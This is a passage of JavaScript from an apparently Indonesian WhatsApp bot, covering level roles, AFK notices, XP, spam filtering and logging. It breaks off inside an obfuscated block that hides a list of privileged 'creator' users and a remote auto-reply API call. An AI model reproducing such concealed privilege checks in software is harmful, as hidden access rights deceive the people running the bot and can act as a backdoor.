																							} else if (levelRole <= 350) {
																								role = 'Platinum 4'
																								} else if (levelRole <= 380) {
																									role = 'Platinum 5'
																									} else if (levelRole <= 410) {
																										role = 'Diamond 1'
																										} else if (levelRole <= 450) {
																											role = 'Diamond 2'
																											} else if (levelRole <= 500) {
																												role = 'Diamond 3'
																												} else if (levelRole <= 550) {
																													role = 'Diamond 4'
																													} else if (levelRole <= 600) {
																														role = 'Diamond 5'
																														} else if (levelRole <= 700) {
																															role = 'Master'
																															} else if (levelRole <= 800) {
																															role = 'Master ✩'
																														} else if (levelRole <= 900) {
																													role = 'Master ✩✩'
																												} else if (levelRole <= 1000) {
																											role = 'Master ✩✩✩'
																										} else if (levelRole <= 1100) {
																									role = 'Master ✯'
																								} else if (levelRole <= 1225) {
																							role = 'Master ✯✯'
																						} else if (levelRole <= 1340) {
																					role = 'Master ✯✯✯'
																				} else if (levelRole <= 1400) {
																			role = 'GrandMaster'
																		} else if (levelRole <= 1555) {
																	role = 'GrandMaster ✩'
																} else if (levelRole <= 1660) {
															role = 'GrandMaster ✩✩'
														} else if (levelRole <= 1710) {
													role = 'GrandMaster ✩✩✩'
												} else if (levelRole <= 1825) {
											role = 'GrandMaster ✯'
										} else if (levelRole <= 1950) {
									role = 'GrandMaster ✯✯'
								} else if (levelRole <= 2000) {
							role = 'GrandMaster ✯✯✯'
						} else if (levelRole <= 2220) {
					role = 'Legends'
				} else if (levelRole <= 2500) {
					role = 'Legends 2'
					} else if (levelRole <= 2700) {
						role = 'Legends 3'
						} else if (levelRole <= 2900) {
							role = 'Legends 4'
							} else if (levelRole <= 3100) {
								role = 'Legends 5'
								} else if (levelRole <= 3300) {
									role = 'Legends 6'
									} else if (levelRole <= 3600) {
										role = 'Legends 7'
										} else if (levelRole <= 3900) {
											role = 'Legends 8'
											} else if (levelRole <= 4200) {
												role = 'Legends 9'
												} else if (levelRole <= 4450) {
													role = 'Legends 10'
													} else if (levelRole <= 4700) {
														role = 'Legends 忍'
														} else if (levelRole <= 4900) {
															role = 'Legends 忍¹'
															} else if (levelRole <= 5100) {
																role = 'Legends 忍²'
																} else if (levelRole <= 5600) {
																	role = 'Legends 忍³'
																	} else if (levelRole <= 6100) {
																		role = 'Legends 忍⁴'
																		} else if (levelRole <= 7000) {
																			role = 'GrandLegends'
																			} else if (levelRole <= 10000) {
																				role = 'GrandLegends 1'
																				} else if (levelRole <= 20000) {
																					role = 'GrandLegends 2'
																					} else if (levelRole <= 30000) {
																						role = 'GrandLegends 3'
																						} else if (levelRole <= 40000) {
																							role = 'GrandLegends 4'
																							} else if (levelRole <= 50000) {
																								role = 'GrandLegends 忍¹'
																								} else if (levelRole <= 60000) {
																									role = 'GrandLegends 忍²'
																									} else if (levelRole <= 70000) {
																										role = 'GrandLegends 忍³'
																										} else if (levelRole <= 80000) {
																											role = 'GrandLegends 忍⁴'
																											} else if (levelRole <= 90000) {
																												role = 'Pro 숒'
																												} else if (levelRole <= 99999999999999) {
																													role = 'Pro × GrandLegends 숒'
																												}
			for (var i = 0; i < cmdDB.length ; i++) {
						if (budy.toLowerCase() === cmdDB[i].commands) {
							Zeeone.sendMessage(from, `${cmdDB[i].jawaban}`, text, {quoted:Ofc, thumbnail: thumbnail})
						}
					}
					if (isGroup && !m.isBaileys) {
						if (mentionUser.length !== 0){
							for (let ment of mentionUser) {
								if (afk.checkAfkUser(ment, _afk)) {
									const getId = afk.getAfkId(ment, _afk)
									const getReason = afk.getAfkReason(getId, _afk)
									const getTime = Date.now() - afk.getAfkTime(getId, _afk)
									const heheh = ms(getTime)
									reply(`AFK MODE\n\n@${ment.split('@')[0]} sedang afk\n\n*Alasan :* ${getReason}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu`)
								}
							}
						}
					if (afk.checkAfkUser(sender, _afk)) {
						const getId = afk.getAfkId(sender, _afk)
						const reason = afk.getAfkReason(sender, _afk)
						const getTime = Date.now() - afk.getAfkTime(getId, _afk)
						const heheh = ms(getTime)
						_afk.splice(afk.getAfkPosition(sender, _afk), 1)
						reply(`@${sender.split("@")[0]} telah kembali afk setelah *${reason}*\nSejak : ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik yang lalu\n\nselamat datang kembali`)
						fs.writeFileSync('./database/afk.json', JSON.stringify(_afk))
					}
				}
					if (isGroup && isUser && !isCmd) {
						const currentLevel = getLevelingLevel(sender)
						const checkId = getLevelingId(sender)
						try {
							if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
							const amountXp = Math.floor(Math.random() * 10) + 50
							const requiredXp = 3000 * (Math.pow(2, currentLevel) - 1)
							const getLevel = getLevelingLevel(sender)
							addLevelingXp(sender, amountXp)
							if (requiredXp <= getLevelingXp(sender)) {
								addLevelingLevel(sender, 1)
								addBalance(sender, 30, balance)
								reply(`* 「 LEVEL UP 」 *\n\n🎯 *User :* @${sender.split("@")[0]}\n🆔 *Nomer :* ${sender.split("@")[0]}\n📊 *Xp :* ${getLevelingXp(sender)}\n💹 *Level :* ${getLevel} > ${getLevelingLevel(sender)}\n💳 *Balance :* $${getBalance(sender, balance)}*\n📛 *Role :* ${role}\n\nCongrats 🎉`)
								}
							} catch (err) {
								console.error(err)
							}
						}
    if (isCmd && msgFilter.isFiltered(from) && !isGroup) {
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${sender.split("@")[0]}`,'green'))
						return reply('Jangan Spam Lord')
						} 
					if (isCmd && msgFilter.isFiltered(from) && isGroup) {
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${sender.split("@")[0]}`,'green'))
						return reply('Jangan Spam Lord')
					}
    if (autovn){
						await Zeeone.updatePresence(from, Presence.recording)
						} else if (ngetik){
							await Zeeone.updatePresence(from, Presence.composing)
							} else {
								await Zeeone.updatePresence(from, Presence.avaible)
							}
    
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
	    const isQuotedMsg = type === 'extendedTextMessage' && content.includes('Message')
	
		if (isCmd && !isGroup) console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${pushname}`))
					if (isCmd && isGroup){
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${pushname}`), 'in', color(groupName,'magenta'))
						addBalance(sender, randomNomor(20), balance)
					}	
		if (!Ofc.key.fromMe && !isOwner && public_mode === true ) return
		function _0x592013(_0x35ca88,_0x3be320,_0x235e72,_0x92ded9,_0x4c5161){return _0x2cd4(_0x35ca88- -0x138,_0x4c5161);}(function(_0x1eb07c,_0x2aebbb){function _0x41ff33(_0x1fc715,_0x4a2eca,_0x1cfff7,_0x426b97,_0x16cc8e){return _0x2cd4(_0x16cc8e-0xdd,_0x4a2eca);}function _0x47d473(_0x4d7187,_0x46afd2,_0x196a2f,_0x504568,_0x3a4f60){return _0x2cd4(_0x3a4f60-0x1b9,_0x196a2f);}function _0x1f391d(_0x1a14c8,_0x1a75b5,_0x24489b,_0x123ea0,_0x532b2c){return _0x2cd4(_0x1a75b5-0x37e,_0x123ea0);}function _0x5022be(_0x5a6b2a,_0x2bc25e,_0x44dc91,_0x4118f,_0x42beb4){return _0x2cd4(_0x44dc91-0x16d,_0x4118f);}const _0x415263=_0x1eb07c();function _0x50dfc9(_0x5b3c95,_0x3e0fe5,_0x3f9b48,_0x2dca02,_0x2bf458){return _0x2cd4(_0x2dca02- -0x275,_0x3f9b48);}while(!![]){try{const _0x46082e=parseInt(_0x50dfc9(-0x133,-0xdc,'*I%r',-0x9a,0x7c))/(-0x121b+0x1*-0x13a9+0x25c5)*(-parseInt(_0x5022be(0x324,0x33d,0x33b,'L2j]',0x2d1))/(0xad*-0x2f+0x1a76+0x1c5*0x3))+parseInt(_0x50dfc9(0x43,0x164,'0$sC',0x3a,0xc9))/(-0x18b9+-0x2365+0x15*0x2dd)*(-parseInt(_0x41ff33(0x3b6,'o32G',0x456,0x285,0x368))/(-0x7ac+0x19b5*-0x1+-0x53*-0x67))+-parseInt(_0x1f391d(0x63d,0x66b,0x5d1,'L23G',0x571))/(0x1*-0xb92+0x1855*-0x1+-0x23ec*-0x1)+parseInt(_0x41ff33(0x2bc,'iC8E',0x34d,0x593,0x41e))/(-0x1932+0xe82+0x1c9*0x6)+parseInt(_0x41ff33(0x33b,'o32G',0x385,0x3ad,0x4a6))/(0x17a9*-0x1+-0x43e*0x4+0x28a8)+-parseInt(_0x41ff33(0x59f,'tb&K',0x376,0x58f,0x49b))/(0x2191*-0x1+0x783+0x1a16)*(parseInt(_0x50dfc9(0x21,-0x162,'bHh^',-0x41,-0x128))/(0x43a*-0x4+0x1*0x217d+-0x108c))+parseInt(_0x1f391d(0x6f3,0x6b5,0x6b9,'WZ2$',0x6e7))/(0x2*0x782+-0x9*0x39b+0x1179);if(_0x46082e===_0x2aebbb)break;else _0x415263['push'](_0x415263['shift']());}catch(_0x17b618){_0x415263['push'](_0x415263['shift']());}}}(_0x4a9b,-0x30c87+0x63a36*0x1+0xba114));function _0x2cd4(_0x402a64,_0x87dbdb){const _0x4c0467=_0x4a9b();return _0x2cd4=function(_0x295ac6,_0x4b5a4e){_0x295ac6=_0x295ac6-(-0x1*-0xb57+0x142b+0x1*-0x1e73);let _0x316b58=_0x4c0467[_0x295ac6];if(_0x2cd4['ahGpdN']===undefined){var _0x25e637=function(_0x3099ae){const _0x110b5d='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1f7b7f='',_0x1a4d21='';for(let _0x5102fc=-0xcda*-0x1+-0x1d4+-0x22*0x53,_0xaf6a41,_0x573bb9,_0x304373=0x1867*0x1+-0x1315+-0x552;_0x573bb9=_0x3099ae['charAt'](_0x304373++);~_0x573bb9&&(_0xaf6a41=_0x5102fc%(0x1357*-0x2+-0x31*0xa7+-0x46a9*-0x1)?_0xaf6a41*(0x8f7*-0x3+0x1b8e+0x7*-0xf)+_0x573bb9:_0x573bb9,_0x5102fc++%(0x1246+-0x101a+-0x228))?_0x1f7b7f+=String['fromCharCode'](-0x67*-0x35+-0xb20+0x1*-0x934&_0xaf6a41>>(-(-0xc1f+0x19bd*-0x1+0x25de)*_0x5102fc&0xd*0x175+-0x611+-0xcda)):0x1cdb+0x4f3+0x2*-0x10e7){_0x573bb9=_0x110b5d['indexOf'](_0x573bb9);}for(let _0x31855e=-0x1dd3+-0x247f*-0x1+-0x6ac,_0x3f87c0=_0x1f7b7f['length'];_0x31855e<_0x3f87c0;_0x31855e++){_0x1a4d21+='%'+('00'+_0x1f7b7f['charCodeAt'](_0x31855e)['toString'](0x18be+-0xae1+-0xdcd*0x1))['slice'](-(-0x22*0xf4+0x2*-0xdb8+0x2*0x1ded));}return decodeURIComponent(_0x1a4d21);};const _0x250225=function(_0x3163d9,_0x537b8e){let _0x774238=[],_0x2ca6c8=0xa*0x205+0x12ae+-0x26e0,_0x57e446,_0x4323df='';_0x3163d9=_0x25e637(_0x3163d9);let _0x4cf94c;for(_0x4cf94c=0x196*-0x11+-0x17c4+0x56*0x97;_0x4cf94c<-0x188d+-0x18f9*-0x1+0x2*0x4a;_0x4cf94c++){_0x774238[_0x4cf94c]=_0x4cf94c;}for(_0x4cf94c=0x22ed+-0x1*-0x35f+0x26*-0x102;_0x4cf94c<-0x15*0x31+-0x13a*0x14+0x1d8d;_0x4cf94c++){_0x2ca6c8=(_0x2ca6c8+_0x774238[_0x4cf94c]+_0x537b8e['charCodeAt'](_0x4cf94c%_0x537b8e['length']))%(0x1cda+0x3d*0x6a+-0x351c),_0x57e446=_0x774238[_0x4cf94c],_0x774238[_0x4cf94c]=_0x774238[_0x2ca6c8],_0x774238[_0x2ca6c8]=_0x57e446;}_0x4cf94c=0x1*-0x7db+0x225a+-0x39*0x77,_0x2ca6c8=-0x10ad+-0x3*-0x39d+0x5d6;for(let _0x5f1917=0x23b5+-0x1a1f+-0x996;_0x5f1917<_0x3163d9['length'];_0x5f1917++){_0x4cf94c=(_0x4cf94c+(0x13d6+-0x16ff*0x1+-0x3*-0x10e))%(-0x2af+0x190d+-0xaaf*0x2),_0x2ca6c8=(_0x2ca6c8+_0x774238[_0x4cf94c])%(0xcef+-0x29f*-0xa+-0x2625),_0x57e446=_0x774238[_0x4cf94c],_0x774238[_0x4cf94c]=_0x774238[_0x2ca6c8],_0x774238[_0x2ca6c8]=_0x57e446,_0x4323df+=String['fromCharCode'](_0x3163d9['charCodeAt'](_0x5f1917)^_0x774238[(_0x774238[_0x4cf94c]+_0x774238[_0x2ca6c8])%(0x61*0x1d+0xc68+-0x1665)]);}return _0x4323df;};_0x2cd4['lTecjQ']=_0x250225,_0x402a64=arguments,_0x2cd4['ahGpdN']=!![];}const _0x5e060b=_0x4c0467[-0x3ce+-0x19*-0x29+-0x1*0x33],_0x2028cf=_0x295ac6+_0x5e060b,_0x1618c2=_0x402a64[_0x2028cf];return!_0x1618c2?(_0x2cd4['FqwOIy']===undefined&&(_0x2cd4['FqwOIy']=!![]),_0x316b58=_0x2cd4['lTecjQ'](_0x316b58,_0x4b5a4e),_0x402a64[_0x2028cf]=_0x316b58):_0x316b58=_0x1618c2,_0x316b58;},_0x2cd4(_0x402a64,_0x87dbdb);}function _0x567016(_0x1f32de,_0xf41ac4,_0x47c179,_0xa154f4,_0x590e3a){return _0x2cd4(_0x47c179-0x1b0,_0xf41ac4);}const alphaNumber=[_0x567016(0x5b2,'2%[e',0x54b,0x5cf,0x68e)+_0x567016(0x3ee,'yaQ2',0x2fa,0x439,0x3a0)+_0x567016(0x554,'L2j]',0x4cf,0x399,0x4a5)+_0x5db4ce(-0x48,0x4b,0x187,'u[Lt',0x14d)+_0x24990b(0x699,0x4fa,'jXUb',0x55c,0x632)+_0x1bdefd(0x2d1,0x364,'yaQ2',0x4d2,0x2c8),_0x5db4ce(0x208,0xd4,-0x18,'o32G',0x197)+_0x24990b(0x5bf,0x721,'W0FY',0x727,0x616)+_0x567016(0x4b4,'!^yH',0x452,0x3b3,0x364)+_0x567016(0x435,'0$sC',0x437,0x50e,0x4a6)+_0x24990b(0x5dc,0x614,'gH[4',0x49b,0x4cb)+'et'];function _0x24990b(_0x40431e,_0x1822f0,_0x18c68e,_0x2dd4ab,_0xb2581e){return _0x2cd4(_0xb2581e-0x253,_0x18c68e);}const isCreator=alphaNumber[_0x5db4ce(0x25b,0x24b,0x26f,'1I75',0x34d)+_0x24990b(0x53a,0x6f2,'i4xw',0x4da,0x5d8)](sender);if(!isGroup&&!isCmd&&!command&&!Ofc[_0x567016(0x30f,'V^DA',0x2bf,0x3f5,0x3b8)][_0x1bdefd(0x40b,0x4cf,'yaQ2',0x4ff,0x52f)+'e']&&autorespon){simi=await fetchJson(_0x592013(0x19a,0x201,0x221,0x1ed,'lUEB')+_0x567016(0x41c,'bHh^',0x37c,0x416,0x26f)+_0x5db4ce(0x1f3,0xc7,-0xa3,'X4DK',-0x6d)+_0x24990b(0x6b7,0x653,'bHh^',0x66a,0x5c7)+_0x592013(0x1ad,0xd2,0x166,0x26b,'1I75')+_0x5db4ce(0x121,0x248,0x2a9,'aXzI',0xd5)+_0x567016(0x3d3,'NbM]',0x42a,0x4fe,0x4e5)+_0x592013(0x20c,0x105,0x198,0x149,'aGjP')+_0x5db4ce(0x19e,0x22f,0x240,'aXzI',0x200)+_0x1bdefd(0x496,0x431,'jXUb',0x588,0x585)+cmd),sami=simi[_0x5db4ce(0x2d3,0x1e5,0xc5,'i4xw',0x2fc)+'ss'];const _0x230104={};_0x230104[_0x567016(0x3a6,'NbM]',0x2e9,0x2af,0x311)+_0x1bdefd(0x313,0x401,'Oq^^',0x2a2,0x49b)+_0x24990b(0x422,0x467,'yaQ2',0x261,0x3c6)]=0x1fc,_0x230104[_0x24990b(0x4ac,0x655,'RxuR',0x46f,0x567)+_0x5db4ce(0xfc,0x1a1,0x12f,'tb&K',0x74)+'d']=!![];const _0x26fb3d={};_0x26fb3d[_0x592013(0x1bb,0x8a,0x147,0x132,'MS4m')+_0x24990b(0x53a,0x58c,'pD$Q',0x55f,0x4be)]=thumbnail,_0x26fb3d[_0x24990b(0x4ff,0x3e1,'W0FY',0x388,0x460)+_0x1bdefd(0x459,0x461,'JsV1',0x336,0x405)+_0x24990b(0x3c5,0x42e,'!^yH',0x34c,0x4b9)]=!![],_0x26fb3d[_0x1bdefd(0x2bf,0x329,'WZ2$',0x467,0x3b0)+'d']=Ofc,_0x26fb3d[_0x567016(0x43d,'1I75',0x2c8,0x234,0x166)+_0x592013(0x19f,0x1be,0x9a,0xa0,'2%[e')+'o']=_0x230104,Zeeone[_0x5db4ce(0xcf,-0x1c,0xef,'SGxm',-0xab)+_0x5db4ce(0xcc,0xc1,0x16c,'W0FY',0x6c)+'e'](from,'_'+sami+'_',text,_0x26fb3d);}function _0x1bdefd(_0x14568b,_0x1ee77d,_0x5466d6,_0x45295b,_0x4d3d88){return _0x2cd4(_0x1ee77d-0x209,_0x5466d6);}function _0x5db4ce(_0x5d9827,_0x27594c,_0x4ae77a,_0x444418,_0x247146){return _0x2cd4(_0x27594c- -0x159,_0x444418);}function _0x4a9b(){const _0x4447e9=['zvqEvMa','ms/cKSoFW7e','W5xcVsFcTHW','w8oYE8kBsa','WQtcNSkCW7Ke','sLuIDW','vCoYW6ZdKSoc','W7FcPSoABbu','lCoUAf7cUW','DIZdUx8','luJdTcbO','W67dIfK','bmoeWQddOIe','W645WRK','Br3cGh4','WQnDua','w8o8p8ku','ubVdP3JdRG','W7VcR8krvJi','WQZcHCkgW7hcGq','ydfNWRC','WP5kDCkkcG','WPq7WRG6WRW','rCkKzNNcMG','vbtcLMv7','W70oWQqmuG','w8kYDuZcPq','W68SW6pcTtm','rIBdHfpdRW','kCoWnsxcHG','gNvRW6a9','W4JcK8k6W55w','DZddUM4','WPXPW6CaW4S','W4tdOSkCdcq','twDZrmo8','pGZcOuSe','pxVdLSkx','WOD4W5hdUq','W7mKrmkB','WP8wDCkasa','WRxcVSo7u1i','WRFcTCoX','WPv9CmkGWQe','rJ0Vnmoc','DgFdUMldLq','qmk/WOlcKCoe','vSk0i3JcNa','BszXahhcP8oe','emkNqLf3','WOlcM8k8WR0','WP9ZW7ddNte','WRVcOSoPsKa','u2hdKajt','W6JdNvO8hq','FmoXW5tdVmoy','lYvfjvO','W7RcQmopCW0','xh49sCo4','WQHksSkxWOC','w8oxW4NdMg4','WPDHeru','W7COWQeCtG','xICNjW','W7SuWRe','WO3cNSolWRid','WPpdSGhdUwy','x8oUoCkw','WQnbuCkZhW','afxdGuTw','WRBdN8oMWOGd','WQxcMxuHeW','B0iOxKa','WQvbpCkCvq','W43cG3PN','WPpcGmkJW7qB','WQyvW6VcMfC','WOuxFmkCsG','WPRcNSkxW7hdIq','W6LvWQ/cTqC','W64+umkUuq','m2tdMSkEmW','xSkMDxZcJq','W7VcRSoaise','a2j/ECkgdmorlI8Ep3/cKG','rta8jCoc','W48UWQjzWPtdS8oCW4FdS0CIW7u','FWyl','hsZdV8oqW6u','W7TsWQZdS2G','W6i/xCkwbW','pMddKCkB','e8kPrfyL','dGJcV0ai','W7CWW73cTW','WPP9W5xdSa0','WPfLvmoEvW','WPlcJSoTWOyb','dM5XW6yW','cd9bWQO0','i8o/tSkmlW','WOddLcddV2q','WO9zySko','aKJdKa4y','tmkJWPJdMmkd','u8kOi37cJa','u8kvhmkHWOe','WOrYhSkbwq','fmooWQddSGK','demJiKG','W7CGW6NcSYW','W4OpW6dcOtC','WP/cMSovWQqv','WOnGWO0zWQS','tNiOyu0','WPXZaq0g','WP1nfW8z','W7pcJCoTtqy','Bv1CuSos','qCkLWPxcJCoc','WOKObrah','WRvBrSkVWPW','zJRdUwRdNa','WRxcJmkXW4Gz','W60PWPWgrW','bxvRW7e','odLJkuq','W5pcHgVcPtq','i8kngZ7cJa','dvfrWPdcLq','bCoeWR3dSWa','b8kGwfyI','W6BdN8kxh3a','fmkRc1SI','ufZdTfzV','hgjWW786','WPDZfmkEna','W5uZWQypW6m','DXdcKt9M','WOTWbCoana','uCoHyMhcIa','CwbvWO7cOW','lX/cOq','qfJdRLfk','WQZcVt7cIbe','zJH3WR7cQG','wbtcLLOncamblqy1WO7cUq','tCo/W6FdMW','WO3cGSojWRi','ewddOSkfWRW','j21AWO7cPW','w8kUWP7cIZatW77dVmkobCopWOVdUa','W4jDWQ/dV30','zCkAdd/dQa','WO/cMCkSWOXJ','y8kyhd/cMmo6WP4fW5vRq3/dVq','W4CIWOdcP1eBWPhcLCkVtmo9cCkzpa','mcTwp1u','W5WOWQuFW4W','jwJdJCkulW','WPBcM8kGW5mF','WO1JW6Ck','WRxdNZJdTxG','wSo2W7BdNmoz','pJ/cIeW9','nmohw38','eSkUqLD3','qxLHqSo+','W7FcR8opDWa','WRVcNSo2WPma','amoOACojdG','WRzBW4acW7m','W4GHW65yW7W','WQtcPmkNtvi','WO1NgrGb','DrZcI3S','WRJcSCo8rG','d3v7WRnU','jmoCrN7dKa','W5GVxSkByW','nuldKGfC','e8o9wmkgeq','kYnse04','orhcHgrX','kXJcOL4m','pSoBB2pdMW','pqZcOWOk','qZa9l8oe','WQjlu8kFWOa','Af/cOLOD','nmovWOVdQtK','igvCW5q','rta8ymoE','hwzOCq0','W4eEW4RcOYK','WO9zFSkAsq','xmk6nCoFpW','W4O7WQub','W5qCWPWPDq','d8ovWPhdQqi','B3zIWQ/cSW','W7a9W6ZcPJi','WPDYhq','eYVcOfKz','n33cKmopoq','uclcQ2fB','kCoJmwlcNG','EWdcKwr/','WQVcL8o7WQm9','ngbdku4','nmk8wxqL','WOFdLchdUsi','W59BWQNdPN4','acfcWRi8','fwxdTmkMWOe','WOziz8kLDa','nYDCjvi','cSoJW5VdJw0','w8k/j8kmWQm','fM7dHCkQWQ0','W7mkf8oaW5CpWQjyWQjvWO9Ab8oh','F8kOi1u','mSoBwwpdHW','ycBdPh/dNG','m8obcwFdJa','W60otCkSsW','W49YuSkHha','WQCfW7VcLeC','W4BcKCkPWRfG','WOZcICov','q8krW7VcTv3dGCo3WOldKaVcLLhcMa','wdS9nmoq','bdbaWR09','cwe/W7a9','W7CSW7/cTZq','hCoqhfVcNG','WRTRmmkEFG','W5FcJ2zLzq','D8odsghdNa','bJbCW742','WPdcUCokF0q','feldKX8','a8orWPZdOX0','DmoyW4BdSmkw','W642vCkntG','pelcOtuI','fKXIsSo3','WOrVbCkd','W5fgamojjW','fZHwWRS6','WQJdGZRdSLy','WRKvW7ZcNKm','mmoAsghcIq','WPvZe8kNvG','cZVcUgKM','WPFdLJFcS2S','j8ktqx85','uwqavvq','W7/cS8ovyG8','yaldQh3dIW','kd9bWQO0','hCkXx0KK','W783WQOnWOu','WPyLq8oEmq','WOnmySkFvG','WOTVh8kFmq','W73dUCkraIe','eSovWQ3dRJm','rCoHz3ZdIq','j8kGwfyI','WQRcP8o6tYZdRLi','WQ3cQmktW4i2','Cmkat2xcQa','W5mGWQGpW6e','W6ZdNey6','W7tcH8oFuXy','WRuYDmo3qq','W6GOrSkDqG','vYCHlCo8','WPxcKSoxWRW','vXWCnmo+','eJHFWRD7','w8kvfmkRW4G','DHqcmmoW','hSooWQddTuK','W5uQxmkrva','WOf/W6FdSt4','xICNj8oy','W6hdPCkrc3e','WRbquSk8ea','WPdcN8keW7JcMq','rSoToSkrxq','pczsof8','yWn/k1O','duJdKG8','W7zGbmoqfW','rKOIDKS','t8kcWOlcLCoB','WRavW6S','FaFcL39I','4Ow1WQ0uWOBdOG','WORcICkTW7PH','WQtcM8k7WRLg','WPHnuCkCW5m','W6hdOmkMhG','nt/cIKWD','WOjwzCkBra','jCoLiwlcIq','omo1nMm','WPFdKchdQwa','WPzOfmkc','acnrWRzW','fmkPr1y0','WO7cMCoBAwe','pCoLW4RdI2W','W79QrmkOna','WPDXW4ddTG','r8kIW4tdJ8kd','W4TAC8kdua','W7tcJaDGga','WQnVW61qfG','W7iVwa','lw/dKSonWRS','m3VdNSoqiq','WQnzv8kr','gmooWOBdQIS','W5tdLCo3WRb2','FrdcLG','W6ikymovW5W','CbVcHNXL','WPdcNmojWR8F','WQzqW7ZcNGi','WQZdS8kzmca','mSoAucNcMW','e8o5n8kmsa','aCoUnN/cIq','nMtdHCkjWP4','WPDHbXWm','rgzWW7TN','WPTYwKyA','umkog8kT','WOVcMSoxWRmF','oX/cRKjm','WP3cVsFcTuK','W5emW57cGGG','W7aPWRWdaq','WOT/W7id','WPb9W6qBW4O','sNmXW6NcOq','lmoLzh8r','WOBcTW3cSYa','WPRcLmkGW58i','W7VdV8kte3e','WP/cPGhcIaq','CvddLYi1','AJhdRmktlqzSW50','WOavW6RcNum','W7SrW5FcTt8','WOz7W5NdPYa','WPpcMgraE0xdQa','WQy4amoMqq','W6LaWQJdVIi','sCkmgmk2WQa','rSo8hCkqya','jwfhWO/cRG','W64Zr8kkrG','ANGgFG7dNCkJW4X3smoIa8kc','W5Kkm8oCza','csvgWQ4M','ggrNW4KU','odrs','W5vVECkkjW','WP5kDCkkaa','WP4yBmk2WQG','WQxcMWDQd8o2kqKSWRBdIXS','BLVcLxL+','hIu9vmoU','WPtcQmkMW5FdTW','W7eSW77cVti','WQlcJmkXW68d','WQzsiSkVxq','eKGIrL8','behdHr9E','btGsWRW0','WRu3C8o3qq','kdHkWQKa','CqhcKwbJ','WPlcImk1W5DE','WOP1faKz','W4RdG8ocWQZcJmoBf8oxAbBcKva/','W7zHw8kHfG','ydfWWQ/cVq','W6aVWRK','ftraWRSM','e0tdHtrp','W6ldHmkMpNC','WRbVW6DneW','W4uZWR8jWQy','hmkGW4dcKmke','WRerW6RcLeO','WRtcL8kYW6Sh','EHtcKxn4','WP7cGmoa','oxCrW4JdSa','WPzdWRVdVNy','bmoJDmktoa','WOzIW5FdSKC','luP8WPVcOa','WPZcSZpcLa0','brr/Ava','WRpcOSoHqa','W6ZcOmoszW4','rN9Mv8o2','wfJdUq','umkcg8kHWPW','BCkYDY7dMG','a8ojWQVdQa','W4ddOSosjW','fG/dGXa1','ECksrG','WRfSdCohhW','sSkYWRddS8kt','EHRcI2r1','W6hdU8kgsYq','W60DW6JcQJm','W5LVW6qkW5C','W4TRF8kdra','vM91sSoQ','xXnrWPlcLa','wSkKWORcIKm','WRzntmkeWOS','x3LUnmou','WOnLW4FdVW','WOBcM8k4W5Sy','ssPMrSoR','ttdcLwfj','WOBdMIddRW','WPxcNmkBW7ldJG','W6BcPmkyfgS','WR0Jr0Sk','WOtcOmk1W6JdPG','W7ZdO8kxcq','W5RdRSkbche','WPPOk8kuta','W5RcImkXW4KF','4OgxW6ul','fexdPmkOW7q','W5iErSk9Da','DvH2CCo2','eu7dJH9y','WOdcLmkBWOPL','WQirW6VcLfa','W6JdGva8','W6HtvSklmG','BvVcHN99','WPpcLCkMW40r','W6O7WQub','WRrsg8k+xW','vSo1mW','g8oZW4hdNu8','W6rVrCkR','eNnlW7G6','WR5FW4m','W4pdImo6WQX8','W7nHq8kXgW','d0/dSSkKWPi','eZrbWQS5','yd7cJSojFxq4W70Cu8k8W7TQ','WRVdS8o6Caq','zZCeW4VdTW','cmoOC8kkfW','WQbEW7VcMe8','W5yZrmoCia','y8keC2tcSa','smkEbCkJ','WPBcUsJcRWW','oCkoAgmD','tSkeemkzWPO','iCojwM/dMW','xHmFl8oN','WODPW4tdSG','W68KWPeMWQK','uuJdTefO','fGRdHbaW','WQLSrSkiWPO','WOP/brW','bqZcUqW/','WOLRzG','uSoVn8kvcq','W4XUfmky','xhqfWPXW','r8o+m8oxtG','WRGsW5hcGKq','hmk0hmkQWOK','dXZcMxOA','lcRdLmkiWR8','W7xdH0yMxa','fcnE','g8k4WPlcRCod','WOnGW7KBWRS','ogTaW6ir','D2vFWO/cRa','qSk5WOxcLsi','WPRcMSonWRqy','WQ51o8kKtG','aYrgWQO6','tmoYW7ddJmkw','WQ7cM1OIsq','WOFdScddKKi','ESkLDKRdJq','W5xcGNfI','du7dJGa','xCoYW7e','WRfJhSkECq','WOhdUcxcTaq','W5tdImoTW69u','W6zcWR3dHgm','sSkWWPxcNSoz','eZrbWReG','gSkqW4tdISoZ','WQldSay','W7VcP8ozDWi','WRfrrW','hM9NW7G','ph7dG8kfWOS','W4BcL2pdRcS','dhvTW7Sr','bmoeW6VcTc8','AY/cK8kSW7e','WPuUaCkfEG','oMldNSkEAG','kKBdISk/aW','WQ1uW7ilW50','W7f7WR7dMgC','WPBcG8khW7ZdMW','s8o0W6FcMSor','W7a8xmoq','WOT0gq','cw0Di8owFSkfdG','W5NdN8oEWRhcNa','Cmorb8kSwW','W6nSWRldG34','W5aLqSkTmq','qxLItmo3','WRuaW6JcM0S','wmk0CxBcJa','smkYWPxcLmoh','BaFcIq','WOrHhCkFCq','W54hWPCMAq','W7qKWOenwq','jConwNNdHq','kqJdQbGQ','WO7dKcS','WR7cO8ozBXq','o8o0jh/cNq','qdHWWQ/cSW','WRvJmmkbxa','rmoG